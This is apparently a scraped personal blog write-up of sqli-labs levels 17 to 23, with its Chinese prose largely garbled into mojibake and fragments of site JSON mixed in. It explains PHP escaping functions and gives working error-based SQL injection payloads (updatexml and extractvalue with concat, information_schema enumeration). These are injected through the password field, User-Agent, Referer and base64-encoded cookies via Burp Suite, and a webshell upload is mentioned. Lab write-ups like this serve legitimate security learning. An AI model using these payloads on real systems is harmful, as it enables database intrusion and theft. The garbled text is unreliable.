è®ºæˆ‘è¾“é‚£ä¸ªå•å¼•å·çš„ä½•ç§ç»„åˆæƒ…å†µï¼Œéƒ½æ²¡æœ‰ååº”ï¼Œç»“åˆæºç ï¼Œæˆ‘å‘ç°è¿™é‡Œæœ‰ä¸ªPHPçš„å®‰å…¨å‘½ä»¤ **addslashes()ä¸stripslashes()å‡½æ•°** è¿™è¾¹è‡ªå®šä¹‰äº†ä¸€ä¸ªå‡½æ•° check_inputå‡½æ•°ï¼Œé‡Œé¢å‡ºç°äº†substrã€get_magic_quotes_gpcã€stripslashesè¿™å‡ ä¸ªå‡½æ•°ï¼š get_magic_quotes_gpc()å‡½æ•°get_magic_quotes_gpc()å‡½æ•°å–å¾—PHPç¯å¢ƒé…ç½®çš„å˜é‡magic_quotes_gpc(GPC, Get/Post/Cookie)å€¼ã€‚è¿”å›0è¡¨ç¤ºæœ¬åŠŸèƒ½å…³é—­ï¼Œè¿”å›1è¡¨ç¤ºæœ¬åŠŸèƒ½æ‰“å¼€å½“magic_quotes_gpcæ‰“å¼€æ—¶ï¼Œæ‰€æœ‰çš„â€™(å•å¼•å·)ã€â€(åŒå¼•å·)ã€(åæ–œæ )å’ŒNULL(ç©ºå­—ç¬¦)ä¼šè‡ªåŠ¨è½¬ä¸ºå«æœ‰åæ–œæ çš„æº¢å‡ºå­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è´¦å·ä¸€æ è¾“å…¥çš„å•å¼•å·ç­‰çš„æ•°æ®æ²¡æœ‰æ•ˆæœçš„åŸå› å°±åœ¨è¿™é‡Œ addslashes()ä¸stripslashes()å‡½æ•°addslashes(string)å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ \\çš„å­—ç¬¦ä¸²ï¼š å•å¼•å· â€™ åŒå¼•å· â€œ åæ–œæ  \\ ç©ºå­—ç¬¦ NULL è¯¥å‡½æ•°å¯ç”¨äºä¸ºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å­—ç¬¦ä¸²ä»¥åŠæ•°æ®åº“æŸ¥è¯¢è¯­å¥å‡†å¤‡å­—ç¬¦ä¸²ã€‚ æ³¨æ„ï¼šé»˜è®¤åœ°ï¼ŒPHPå¯¹æ‰€æœ‰çš„GETã€POSTå’ŒCOOKIEæ•°æ®è‡ªåŠ¨è¿è¡Œaddslashes()ã€‚æ‰€ä»¥ä¸åº”å¯¹å·²è½¬ä¹‰è¿‡çš„å­—ç¬¦ä¸²ä½¿ç”¨addslashes()ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´åŒå±‚è½¬ä¹‰ã€‚é‡åˆ°è¿™ç§æƒ…å†µæ—¶å¯ä»¥ä½¿ç”¨å‡½æ•°get_magic_quotes_gpc()è¿›è¡Œæ£€æµ‹ã€‚stripslashes(string)å‡½æ•°åˆ é™¤ç”±addslashes()å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚ substrå‡½æ•°substr(string,start[,length])å‚æ•° æè¿°string å¿…éœ€ï¼Œè§„å®šè¦è¿”å›å…¶ä¸­ä¸€éƒ¨åˆ†çš„å­—ç¬¦ä¸²start å¿…éœ€ï¼Œè§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹æ­£æ•°ï¼šåœ¨å­—ç¬¦ä¸²çš„æŒ‡å®šä½ç½®å¼€å§‹è´Ÿæ•°ï¼šåœ¨ä»å­—ç¬¦ä¸²ç»“å°¾å¼€å§‹çš„æŒ‡å®šä½ç½®å¼€å§‹0ï¼šåœ¨å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤„å¼€å§‹length å¯é€‰ï¼Œè¦è¿”å›çš„å­—ç¬¦æ•°ã€‚å¦‚æœçœç•¥ï¼Œåˆ™è¿”å›å‰©ä½™æ–‡æœ¬æ­£æ•°ï¼šä»startå‚æ•°æ‰€åœ¨çš„ä½ç½®è¿”å›çš„é•¿åº¦è´Ÿæ•°ï¼šä»å­—ç¬¦ä¸²æœ«ç«¯è¿”å›çš„é•¿åº¦è¿™é‡Œè¡¥å……ä¸€ä¸‹æˆ‘çš„ç†è§£ï¼šè¿™ä¸ªsubstrçš„æ„æ€æ˜¯æˆªå–å­—ç¬¦æ®µï¼Œä¹Ÿå°±æ˜¯æˆªå–ä½ è¾“å…¥çš„æ•°æ®å‰å‡ ä½è¿™æ ·ï¼Œç„¶åå°†æˆªå–çš„æ•°æ®è¿›è¡Œè¿‡æ»¤æ“ä½œï¼Œå³åŠ å…¥åæ–œæ æ“ä½œ ctype_digit()å‡½æ•°ctype_digit(string)å‡½æ•°æ£€æŸ¥å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦æ˜¯å¦éƒ½æ˜¯åè¿›åˆ¶æ•°å­—ï¼Œè‹¥æ˜¯åˆ™è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEã€‚ mysql_real_escape_string()å‡½æ•°mysql_real_escape_string(string,connection)å‚æ•° æè¿°string å¿…éœ€ï¼Œè§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²connection å¯é€‰ï¼Œè§„å®šMySQLè¿æ¥ã€‚å¦‚æœæœªè§„å®šï¼Œåˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªè¿æ¥ mysql_real_escape_string()å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼š \\x00 ç©ºå€¼ \\n \\r æ¢è¡Œ \\ â€™ â€œ \\x1a**çŸ¥é“è¿™ä¸ªç‚¹å ï¼Œé‚£å°±è¯´æ˜æˆ‘ä»¬æ— æ³•é€šè¿‡åœ¨è´¦å·ä¸€æ æ³¨å…¥ ** ç„¶åæˆ‘ä»¬çœ‹è¿™ä¸ªå¯†ç è¿™ä¸€æ æœ‰ä¸ªå¼•å·ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åœ¨å¯†ç ä¸€æ é€šè¿‡å¯†ç æ¥æ³¨å…¥æˆ‘ä»¬åœ¨è´¦å·ä¸€æ è¾“å…¥adminä»¥åï¼Œæ¥ç€åœ¨å¯†ç ä¸€æ è¾“å…¥æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥ 1admin'and updatexml(1,concat('~',(select database()),'~'),1) -- 1123'and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'~'),1) -- é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ç»•è¿‡è¿™ä¸ªè¿‡æ»¤å‘¢ï¼Ÿhttps://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control è¿™ä¸ªåšå®¢é‡Œé¢å€’æ˜¯è¯´äº†ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯ç”¨åœ¨è¿™é‡Œå¥½åƒä¸å¤ªåˆé€‚ï¼Œå› ä¸ºå…¶å®æˆ‘ä»¬æ³¨æ„åˆ°ä»–æœ‰ä¸€ä¸ªsubstrå‡½æ•°ï¼Œåªæˆªå–äº†å‰15ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å½“æˆ‘è¾“å…¥çš„è¯­å¥è¶…è¿‡15ä¸ªçš„æ—¶å€™ï¼Œåé¢çš„ä»£ç å°±è‡ªåŠ¨è¢«æŠ›å¼ƒäº†ã€‚è®°å¾—æ‹“å±•å­¦ä¹ SqlParameter ç¬¬ åå…«å…³è¿™ä¸ªå…³å¡å¥½åƒæœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œå…ˆæ¥çœ‹çœ‹æºç ï¼š ![E_{358QK8A23J%N`T0Q%2LM](https://raw.githubusercontent.com/Hwwg/myphoto/master/20201126202559.png) å¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸€å…³ï¼Œå¯¹äºunameå’Œpasswdä¾æ—§åšäº†addslashes()å‡½æ•°å¤„ç†ï¼Œæ‰€ä»¥æƒ³å†è¿™é‡Œæ³¨å…¥ä¸å¤ªå¯èƒ½ å¹¶ä¸”åœ¨è¾“å‡ºunameå’Œpasswdçš„æ—¶å€™ä¹Ÿæ²¡æœ‰å•å¼•å·ç­‰å­—ç¬¦çš„å‡ºç°ï¼Œæ‰€ä»¥æƒ³åœ¨è¿™é‡Œæ³¨å…¥æ˜¯ä¸å¯èƒ½çš„äº† çœ‹è¿™é‡Œ è·å–äº†uagentå’ŒIP è¿™ä¸ªæ˜¯å¹²å•¥çš„ï¼Ÿ HTTP_USER_AGENTï¼šè¿”å›HTTPå¤´éƒ¨çš„USER_AGENTï¼ˆuser_agentçš„å†…å®¹åŒ…å«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ä¿¡æ¯ï¼‰REMOTE_ADDR:ï¼šè¿”å›httpå¤´éƒ¨IPåœ°å€æ¥ä¸‹æ¥æˆ‘ä»¬å†æ¥çœ‹çœ‹è¿™äº›æºä»£ç  åˆ°åº•å“ªé‡Œå¯ä»¥è®©æˆ‘ä»¬æ³¨å…¥æ‰¾åˆ°äº†ä¸€ä¸ªinsertè¯­å¥ è¿™é‡Œå‘ç° åé¢æœ‰ä¸ªå¼•å·ï¼Œè¦æ˜¯æˆ‘ä»¬åœ¨é‡Œé¢è¾“å…¥æˆ‘ä»¬çš„å‘½ä»¤ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥è·å¾—æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯äº†ï¼Ÿé‚£æˆ‘ä»¬è¯¥å¦‚ä½•æ›´æ”¹å‘¢â€”â€”burp suit æŠ“åŒ…å·¥å…·ï¼Œå› ä¸º æˆ‘ä»¬ä»å‰é¢çš„$serventå¯ä»¥çœ‹å‡º è¿™é‡Œæ˜¯éœ€è¦è¿”å›httpå¤´éƒ¨çš„ä¿¡æ¯ï¼Œæ‰€ä»¥ã€‚ã€‚ã€‚ã€‚æ‡‚çš„éƒ½æ‡‚è¯•ä¸€ä¸‹ï¼š çŒœçŒœæˆ‘å‘ç°äº†å•¥ï¼Œè¿™æœ‰ä¸ªuser_agentï¼ŒOK è®©æˆ‘ä»¬å§å¤§è‡´æ€è·¯ç†é¡ºä¸€ä¸‹ï¼šä¸€å¼€å§‹æˆ‘ä»¬éœ€è¦è¿”å›httpå‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ä¿¡æ¯ï¼Œå¦‚æœæˆ‘ä»¬å°†è¿™ä¸ªç”¨æˆ·ä¿¡æ¯æ›´æ”¹å®Œæˆ‘ä»¬çš„æŒ‡ä»¤ï¼Œé‚£å…¶å®å°±æ˜¯è¿™æ ·çš„$uagent=$servent[â€˜è¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥â€™]ç„¶åè¿™ä¸ªæŸ¥è¯¢è¯­å¥ä¼šè¢«ä»£å…¥åˆ°sqlä¸­æ‰§è¡Œï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹å°†user-Agentæ›¿æ¢æˆä»¥ä¸‹è¯­å¥ç°åœ¨user-Agentè¿™ä¸ªè¯­å¥çš„æœ€åæ·»åŠ ä¸€ä¸ªå•å¼•å·ï¼Œçœ‹çœ‹æ˜¯å¦æŠ¥é”™ç»“æœæ˜¯ä¼šæŠ¥é”™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨burp suité‡Œé¢æ·»åŠ æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥ 1'or extractvalue(1,concat('~',database(),'~')),1,1) # è¿™é‡Œè¯´è¯´æˆ‘çš„æ€è·¯ï¼šå› ä¸ºæˆ‘ä»¬å‰é¢çŸ¥é“ï¼Œè¿™ä¸ªæ³¨å…¥ç‚¹æ˜¯åœ¨insertè¯­å¥å½“ä¸­çš„ï¼Œæˆ‘ä¸€å¼€å§‹æ²¡è¾“å…¥åé¢çš„ï¼Œ1,1å¯¼è‡´å‡ºç°é”™è¯¯æç¤ºï¼šå°±æ˜¯å’Œinsertå‰é¢æ’å…¥å€¼ä¸å¯¹åº”çš„æƒ…å†µï¼Œä»–insertæ’å…¥äº†ä¸‰ä¸ªå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä¹Ÿéœ€è¦æœ‰ä¸‰ä¸ªå€¼ ç„¶å#å·æ³¨é‡Šæ‰åé¢çš„å†…å®¹ï¼Œç„¶åè‡³äºåé¢çš„1åŠ ä¸åŠ å¼•å·éƒ½æ— æ‰€è°“ï¼Œå› ä¸º1æ— è®ºåŠ ä¸åŠ å¼•å·éƒ½æ˜¯åˆæ³•æ•°æ®ï¼Œä½†æ˜¯ å¦‚æœè¦åŠ å¼•å· ä¸€å®šè¦ä¸¥æ ¼æŒ‰ç…§insertè¯­å¥çš„æ ¼å¼ æ¯”å¦‚1 å·¦å³ä¸¤è¾¹å°±è¦åŠ  ä¸ç„¶å°±ä¼šæŠ¥é”™ï¼š 12'or extractvalue(1,concat('~',database(),'~')),'1','1') # 'or extractvalue(1,concat('~',(select table_name from information_schema.tables where table_schema='security' limit 0,1),'~')),1,1) # æ¥ä¸‹æ¥å°±æ˜¯çˆ†è¡¨ çˆ†å­—ç¬¦æ®µäº†è®©æˆ‘ä»¬æ„‰å¿«çš„è¿›å…¥19å…³å§è¿™å…³å’Œ18å…³å·®ä¸å¤šå°±æ˜¯æ³¨å…¥çš„ä½ç½®ç°åœ¨åœ¨Referer ç¬¬20å…³è¿™é‡Œæˆ‘ä»¬å…ˆçœ‹çœ‹æºç å§ä¾æ—§åšäº†è¿‡æ»¤æ“ä½œï¼Œæ‰€ä»¥ä¸èƒ½åœ¨è´¦å·å¯†ç è¿™é‡Œæ“ä½œæˆ‘ä»¬å‘ç°ä»–å’Œå‰å‡ å…³ä¸ä¸€æ ·çš„æ—¶å€™è¿™é‡Œåˆè·å–äº†ä¸€ä¸ªcookieæ•°æ® ä»€ä¹ˆæ˜¯cookieï¼ŸCookieï¼Œæœ‰æ—¶ä¹Ÿç”¨å…¶å¤æ•°å½¢å¼ Cookiesã€‚ç±»å‹ä¸ºâ€œå°å‹æ–‡æœ¬æ–‡ä»¶â€ï¼Œæ˜¯æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ï¼Œè¿›è¡ŒSessionè·Ÿè¸ªè€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†ï¼‰ï¼Œç”±ç”¨æˆ·å®¢æˆ·ç«¯è®¡ç®—æœºæš‚æ—¶æˆ–æ°¸ä¹…ä¿å­˜çš„ä¿¡æ¯cookieæ˜¯ä»€ä¹ˆ?æœ‰ä»€ä¹ˆä½œç”¨?cookiesçš„ä½œç”¨ä¸»è¦æ˜¯ï¼Œå½“ä½ è®¿é—®äº†æŸäº›ç½‘é¡µï¼Œå¹¶ä¸”å¯¹ç½‘é¡µçš„ä¸€äº›è®¾ç½®è¿›è¡Œä¿®æ”¹ï¼Œcookieså°±èƒ½è·Ÿè¸ªå¹¶è®°å½•åˆ°è¿™äº›ä¿®æ”¹ï¼Œå½“ä½ ä¸‹ä¸€æ¬¡è®¿é—®è¿™ä¸ªç½‘é¡µçš„æ—¶å€™ï¼Œè¿™ä¸ªç½‘é¡µä¼šåˆ†æä½ ç”µè„‘ä¸Šçš„cookiesï¼Œè¿›è€Œé‡‡å–æªæ–½åƒä½ è¿”å›æ›´ç¬¦åˆä½ ä¸ªæ€§åŒ–çš„ç½‘é¡µ;è€Œä¸”ï¼Œä½ è‡ªåŠ¨ä¿å­˜çš„å†…å®¹ä¹Ÿæ˜¯è¢«è®°å½•åœ¨cookieå½“ä¸­çš„ï¼Œå½“ç„¶ï¼Œç›®å‰å¤§éƒ¨åˆ†å¹¿å‘Šçš„å®šä½åŸºç¡€ä¹Ÿæ˜¯åŸºäºcookiesçš„ï¼Œæ¯”å¦‚ä½ æ­¤å‰è®¿é—®äº†å¤§é‡çš„å¥èº«ç±»ç½‘ç«™ï¼Œcookiesè®°å½•äº†ä½ çš„è®¿é—®è¡Œä¸ºï¼Œå¹¿å‘Šä¸»å°±èƒ½å¤Ÿæ ¹æ®ä½ çš„è®¿é—®è¡Œä¸ºï¼Œå‘ä½ æ¨é€å¥èº«ç±»çš„å¹¿å‘Š æ„Ÿè§‰è¿™ä¸ªå°±æœ‰ç‚¹å±é™©å‘€ï¼Œå¥½åƒå¯ä»¥åˆ©ç”¨cookiesåšç‚¹ä»€ä¹ˆä¸å¾—äº†çš„ä¸œè¥¿ï¼Ÿï¼Ÿï¼Ÿ æˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œæˆ‘ä»¬å¥½åƒå¯ä»¥åˆ©ç”¨è¿™ä¸ªcookeeè¯•è¯•ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¾æ—§ä½¿ç”¨burp suitæŠ“ä¸ªåŒ… ç¬¬ä¸€æ¬¡æ²¡çœ‹åˆ°cookieçš„æ•°æ® æˆ‘ä»¬å†ç‚¹ä¸€æ¬¡forward è¿™ä¸€æ¬¡å°±æœ‰äº† æ¥ä¸‹æ¥è®©æˆ‘ä»¬è¯•è¯•åŠ ä¸ªå¼•å· å‡ºç°äº†æŠ¥é”™ï¼Œç„¶åæˆ‘ä»¬å†è¯•è¯•and 1=1 å’Œand 1=2 ä¸ä¸€æ ·ï¼ŒæŠ¥é”™äº† ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨æ³¨å…¥ç‚¹ æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„æ“ä½œäº† æˆ‘ä»¬åº”è¯¥æ˜¯è¦åˆ©ç”¨æŠ¥é”™æ³¨å…¥æˆåŠŸ ä»£ç æ˜¯ 1' and extractvalue(1,concat('~',database(),'~')) # è¿™é‡Œ æˆ‘å°±åœ¨æƒ³ä¸ºä»€ä¹ˆæˆ‘è¦è¦æŒ‰ä¸¤æ¬¡forwardæ‰èƒ½æˆªå–åˆ°å«æœ‰cooKiesçš„åŒ…å‘¢ï¼Ÿè®©æˆ‘ä»¬å›å»çœ‹çœ‹æºä»£ç å­¦åˆ°è¿™é‡Œ æœ‰å¿…è¦å…ˆæ€»ç»“ä¸€ä¸‹å‡ ä¸ªå¸¸è§å‡½æ•°ï¼Œä¹‹å‰åªæ˜¯æ¨¡æ¨¡ç³Šç³Šçš„æ¦‚å¿µï¼š1.mysqli_query() å‡½æ•°æ‰§è¡ŒæŸä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚2.mysqli_fetch_array() å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰ã€‚ï¼ˆå–å‡ºæˆ‘ä»¬è¾“å…¥çš„é‚£ä¸€è¡Œè´¦å·å¯†ç ï¼‰3.setcookie() å‡½æ•°å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ª HTTP cookieã€‚cookie æ˜¯ç”±æœåŠ¡å™¨å‘é€åˆ°æµè§ˆå™¨çš„å˜é‡ã€‚cookie é€šå¸¸æ˜¯æœåŠ¡å™¨åµŒå…¥åˆ°ç”¨æˆ·è®¡ç®—æœºä¸­çš„å°æ–‡æœ¬æ–‡ä»¶ã€‚æ¯å½“è®¡ç®—æœºé€šè¿‡æµè§ˆå™¨è¯·æ±‚ä¸€ä¸ªé¡µé¢ï¼Œå°±ä¼šå‘é€è¿™ä¸ª cookieã€‚cookie çš„åç§°æŒ‡å®šä¸ºç›¸åŒåç§°çš„å˜é‡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¢«å‘é€çš„ cookie åä¸º â€œnameâ€ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºåä¸º $user çš„å˜é‡ï¼ŒåŒ…å« cookie çš„å€¼ã€‚å¿…é¡»åœ¨ä»»ä½•å…¶ä»–è¾“å‡ºå‘é€å‰å¯¹ cookie è¿›è¡Œèµ‹å€¼ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ 1setcookie(name,value,expire,path,domain,secure) headerï¼ˆï¼‰è·³è½¬å‡½æ•°header(â€œLocation:â€)ä½œä¸ºphpçš„è½¬å‘è¯­å¥ï¼Œæ¥ä¸‹æ¥å°±è·³è½¬æ‰“å¼€æ–°é¡µé¢ï¼Œå¹¶ä¸”å¦‚æœåé¢æ²¡æœ‰ç´§è·Ÿexitçš„è¯ ä»–æ˜¯ä¼šç»§ç»­æ‰§è¡Œçš„åªä¸è¿‡ä¸ä¼šè¿”å›åˆ°é¡µé¢ä¸Šï¼Œè¦æ±‚headerå‰æ²¡æœ‰ä»»ä½•è¾“å‡ºã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦è¿ç»­æŒ‰ä¸¤æ¬¡forwardçš„åŸå› äº†ã€‚æ¥ä¸‹æ¥çš„è¯­å¥å¥½åƒä¹Ÿæ²¡å•¥å…¶å®åœ¨è¿™ä¸€å…³ä¸­è¿˜å¯ä»¥ä½¿ç”¨unionæ‹¼æ¥selectè¯­å¥ä»è¿™ä¸ªé€”ä¸­æˆ‘ä»¬ä¸éš¾å‘ç° å…¶å®username passwordéƒ½æ˜¯ä»cookeeä¸­è·å–çš„ï¼Œç„¶åæˆ‘ä»¬ä¹‹å‰ä¹ŸçŸ¥é“cookeeé‚£é‡Œå­˜åœ¨æ³¨å…¥ç‚¹æƒ³è¦è®©æˆ‘ä»¬éœ€è¦çš„æ•°æ®ç›´æ¥åœ¨usernameå’Œpaswrdè¿™é‡Œè¾“å‡ºï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥order by ç„¶å union select æ‹¼æ¥è¯­å¥æŸ¥è¯¢äº†ï¼Œæ€è·¯å°±è·Ÿä¹‹å‰çš„ä¸€æ ·ã€‚ ç¬¬21å…³ä¸çŸ¥é“ä¸ºå•¥æˆ‘21å…³å’Œ22å…³æ˜¯æ²¡æœ‰çš„ä½†æ˜¯æˆ‘çœ‹äº†ä¸€ä¸‹é¢˜ç›®ï¼Œæ˜¯ä¸Šä¼ æ–‡ä»¶çš„é¢˜ç›® ç„¶åæŸ¥äº†ä¸€ä¸‹ æœç„¶è¿˜æ˜¯è¦ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åéœ€è¦åˆ©ç”¨burp suit","link":"/2020/11/20/sqlilabs5/"},{"title":"sqlilabs6","text":"æ¥ä¸‹æ¥æ˜¯ç¬¬äºŒéƒ¨åˆ†çš„21å…³å…¶å®æ„Ÿè§‰å’Œç¬¬20å…³æ²¡æœ‰å¤šå¤§å·®åˆ«ï¼Œæˆ‘ä»¬çœ‹çœ‹æºç å§ å‘ç°è¿˜æ˜¯æœ‰ç‚¹å·®åˆ«çš„ æ¯”å¦‚è¯´ï¼š æœ‰ä¸€ä¸ª**$cookee = base64_decode($cookee);**å¥½åƒæ˜¯å°†cookeeç»™ç¼–ç è§£å¯†äº†ï¼Œè¯´æ˜å‰é¢è‚¯å®šè¿˜æœ‰ä¸€ä¸ªåŠ å¯†ï¼Œæˆ‘ä»¬ç”¨burp suitæŠ“åŒ…è¯•è¯• æœä¸å…¶ç„¶ ä»–çš„cookeeè¢«åŠ å¯†äº† æˆ‘ä»¬ç›´æ¥ç½‘é¡µæœç´¢è§£å¯†è½¯ä»¶ ç„¶åå‘ç°ç»“æœæ˜¯ adminç„¶åæˆ‘ä»¬åˆ©ç”¨è¿™é‡Œæ¥æ³¨å…¥ä¸€ä¸‹ çœ‹ä¸‹æºä»£ç  å‘ç°æ˜¯â€™)å•å¼•å·ç»„åˆæ‹¬å·çš„ ï¼Œç„¶åæˆ‘ç›´æ¥è¾“å…¥â€™) and 1=1# å‘ç°ä»–æŠ¥é”™äº† \\Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (utf8mb4_0900_ai_ci,COERCIBLE) for operation â€˜=â€™**æœ‰ç‚¹å¥‡æ€ª æˆ‘ä»¬å†æ¥çœ‹çœ‹æºä»£ç  å¯ä»¥å‘ç°è¿™è¾¹è¿™ä¸ªä½¿ç”¨çš„æ˜¯encodebase64_encodeæ˜¯åŠ å¯†,è€Œbase64_decodeæ˜¯è§£å¯†æ‰€ä»¥æˆ‘ä»¬æ¥æ€è€ƒä¸€ä¸‹ä»–ä»£ç æ˜¯å¦‚ä½•è¿è¡Œçš„ ä»–æ˜¯è¿™æ ·çš„ å¦‚æœè´¦å·å¯†ç æ­£ç¡® åˆ™ä¿å­˜ä½ æ­¤æ—¶çš„cookiesï¼Œå¹¶ä¸”åŠ å¯†å‘é€ï¼Œæ‰€ä»¥æˆ‘å†burp suitæŠ“åŒ…çš„æ—¶å€™ï¼ŒæŠ“åˆ°çš„ç”¨æˆ·åå°±æ˜¯åŠ å¯†çš„ï¼Œç„¶åè·³è½¬åˆ°ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œåœ¨è¿™ä¸ªé¡µé¢ä¸­è¦åˆ©ç”¨cookiesè¾“å‡ºè´¦å·å¯†ç ï¼Œæ‰€ä»¥ä»–åˆè§£ç è¾“å‡ºäº†ï¼Œè€Œè¿™ä¸ªæ—¶å€™å¦‚æœæˆ‘ä»¬è¦åˆ©ç”¨burp suitä¿®æ”¹cookiesçš„æ•°æ®è¾¾åˆ°æ³¨å…¥çš„ç›®çš„ï¼Œæˆ‘ä»¬å°±éœ€è¦å°†æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥ä¹Ÿè¿›è¡ŒåŠ å¯†ï¼Œè¿™æ ·ä»–è§£å¯†ä»¥åæ‰ä¼šè¢«mysqlè¯†åˆ«å¹¶æ‰§è¡Œå‘½ä»¤ã€‚OK å¤§æ¦‚äº†è§£æ•´ä¸ªè¿è½¬è¿‡ç¨‹åï¼Œæˆ‘ä»¬å¯»æ‰¾æ³¨å…¥ç‚¹å‘ç°åœ¨ä¸‹é¢ æœ‰ä¸ªâ€™ï¼‰å•å¼•å·åŠ æ‹¬å·çš„æ³¨å…¥ç‚¹ï¼Œç„¶åæˆ‘ä»¬åœ¨burp suitæ³¨å…¥è¯•è¯•unameåé¢çš„é‚£ä¸²ä¸œè¥¿æ˜¯1â€™)and extractvalues(1,concat(â€˜â€˜,database(),â€™â€˜))# ç»è¿‡base64ä½ç¼–ç ä»¥åçš„ç»“æœ è¿™ä¸ªåˆæ˜¯ä»€ä¹ˆç¥ä»™æŠ¥é”™ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªsecurity æˆ‘ä»¬æ•°æ®åº“çš„åå­—çš„å‡ºç° ä½†æ˜¯ä¸ºäº†é¿å…ä¸æ˜¯å¶ç„¶æˆ‘ä»¬å†è¯•è¯•çœ‹ï¼Œæˆ‘æ— è¯­äº† åŸæ¥æ˜¯æˆ‘å‡½æ•°åè¾“é”™äº†ï¼Œåº”è¯¥æ˜¯extractvalue æ‰€ä»¥æ­£ç¡®çš„ç•Œé¢åº”è¯¥æ˜¯ OK åˆ©ç”¨æŠ¥é”™æ³¨å…¥æˆåŠŸ ç¬¬22å…³è¿™ä¸€é¢˜å’Œä¸Šä¸€é¢˜åˆæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œé¢˜ç›®è¯´æ˜¯åŸºäºåŒå¼•å·çš„æ³¨å…¥ä½†æˆ‘ä»¬ä»è¿™ä¸ªè¯­å¥å¯ä»¥å‘ç°ï¼Œä»–ä¸æ˜¯ç›´æ¥åœ¨selecté‡Œé¢æ·»åŠ åŒå¼•å· è€Œå®šä¹‰ä¸€ä¸ª$cookee1 å¹¶ä¸”è¿™ä¸ªcookee1=â€$cookeeâ€å…¶å®æŒ‰ç…§phpçš„è¯­æ³•ä¸Šé¢é‚£ä¸ªå…¶å®å¯ä»¥ç­‰ä»·ä¸ºä¸‹é¢é‚£ä¸ªï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“ä»–ä¸ºå•¥è¦è¿™æ ·æ“ä½œï¼Ÿæ›´å®‰å…¨å—ï¼Ÿç„¶åå°±ç›´æ¥æŠŠä¸Šä¸€é¢˜çš„å•å¼•å·å’Œæ‹¬å·æ¢æˆåŒå¼•å·å°±è¡Œï¼Œå…¶ä»–çš„æ²¡å•¥åŒºåˆ« 23å…³23å…³ åˆå›åˆ°äº†ä»¥å‰ç†Ÿæ‚‰çš„ç•Œé¢ ä½†æ˜¯å¥½åƒè·Ÿä¹‹å‰çš„æœ‰ä¸å¤ªä¸€æ ·ï¼Œå› ä¸ºåŠ äº†å•å¼•å·æŠ¥é”™ åŠ äº†åŒå¼•å·å’Œand1=1 and1=2 å´ä¸æŠ¥é”™ è®©æˆ‘ä»¬å†æ¥ç ”ç©¶ä¸€ä¸‹æºç è¿™é‡Œä»‹ç»ä¸€ä¸ªå‡½æ•°preg_replaceæ›¿æ¢å‡½æ•°preg_replace 